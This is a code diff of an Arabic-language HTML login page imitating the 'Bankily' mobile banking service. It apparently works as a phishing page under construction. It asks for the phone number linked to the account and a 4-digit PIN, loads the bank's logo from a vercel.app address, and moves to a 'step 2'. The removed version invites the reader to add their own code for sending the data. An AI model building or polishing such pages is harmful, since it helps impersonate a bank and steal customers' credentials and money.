@@ -3,76 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bankily - تسجيل الدخول</title>
+    <title>الرئيسية / بنكيلي</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
+        .wrapper { width: 100%; max-width: 450px; background: #fff; padding-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .form-container { padding: 20px; text-align: right; }
+        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
         
-        body { margin: 0; padding: 0; background-color: #ffffff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
-        .wrapper { width: 100%; max-width: 450px; background: #fff; display: flex; flex-direction: column; min-height: 100vh; }
-        .form-container { padding: 20px; flex-grow: 1; }
+        /* إزالة الفراغات غير الضرورية */
+        .pin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .forgot-pass { font-size: 14px; color: #1a5e20; font-weight: bold; cursor: pointer; text-decoration: underline; }
+
+        .input-box { position: relative; border: 1.5px solid #1a5e20; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; padding: 5px 15px; }
+        input { border: none; width: 100%; font-size: 17px; padding: 12px; outline: none; background: transparent; font-family: 'Cairo'; }
         
-        /* شعار */
-        .logo-box { text-align: center; margin: 30px 0; }
-        .logo-img { width: 220px; }
-        
-        .label { font-weight: bold; margin: 20px 0 10px; display: block; font-size: 16px; color: #000; }
-        
-        /* تصميم الحقول بالخط السفلي */
-        .input-box { border-bottom: 1px solid #333; margin-bottom: 10px; display: flex; align-items: center; padding: 5px 0; }
-        input { border: none; width: 100%; font-size: 18px; outline: none; background: transparent; font-family: 'Cairo'; }
-        
-        .icon { width: 22px; margin-right: 10px; }
-        
-        /* الروابط */
-        .link-text { display: block; color: #000; text-decoration: underline; margin-top: 15px; font-weight: bold; font-size: 14px; cursor: pointer; }
-        .register-link { text-align: center; margin-top: 30px; text-decoration: underline; font-weight: bold; cursor: pointer; color: #333; }
-        
-        /* الزر الأصفر في الأسفل */
-        .btn-yellow { 
-            background-color: #ffc107; 
-            color: #fff; 
-            border: none; 
-            width: 100%; 
-            padding: 18px; 
-            font-size: 20px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            margin-top: auto; 
-            text-align: center;
-        }
+        .register-container { text-align: center; margin-top: 10px; }
+        .btn-yellow { background-color: #ffc107; color: #000; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="wrapper">
-    <div class="logo-box">
-        <img src="https://bankily-ap.vercel.app/logo_bankily.jpeg" class="logo-img">    
-    </div>
-
-    <div class="form-container">
-        <label class="label">اسم المستخدم أو رقم الهاتف</label>
+    <div id="p1" class="form-container">
+        <label class="label">رقم الهاتف المربوط بالحساب *</label>
         <div class="input-box">
-            <input type="text" id="tel" placeholder="46297990">
-            <img src="https://img.icons8.com/ios/50/000000/user.png" class="icon">
+            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8">
         </div>
 
-        <label class="label">الرقم السري</label>
+        <div class="pin-header">
+            <label class="label">الرمز السري (PIN) *</label>
+            <span class="forgot-pass">نسيت الرقم السري؟</span>
+        </div>
         <div class="input-box">
-            <input type="password" id="pin" placeholder="----">
-            <img src="https://img.icons8.com/ios/50/000000/lock--v1.png" class="icon">
+            <input type="password" id="pin" placeholder="أدخل الرمز السري" maxlength="4">
         </div>
 
-        <a class="link-text">نسيت الرقم السري؟</a>
-        <div class="register-link">مستخدم جديد ؟ سجل الآن!</div>
+        <div class="register-container">
+            <p style="font-size: 15px; font-weight: bold;">مستخدم جديد ؟ سجل الآن!</p>
+            <button class="btn-yellow" onclick="toStep2()">تسجيل الدخول</button>
+        </div>
     </div>
-
-    <button class="btn-yellow" onclick="submitData()">تسجيل الدخول</button>
 </div>
 
 <script>
-    function submitData() {
-        alert("جاري التحويل...");
-        // يمكنك هنا إضافة كود الإرسال الخاص بك
+    function toStep2() { 
+        alert("جاري التحويل..."); 
     }
 </script>
 </body>
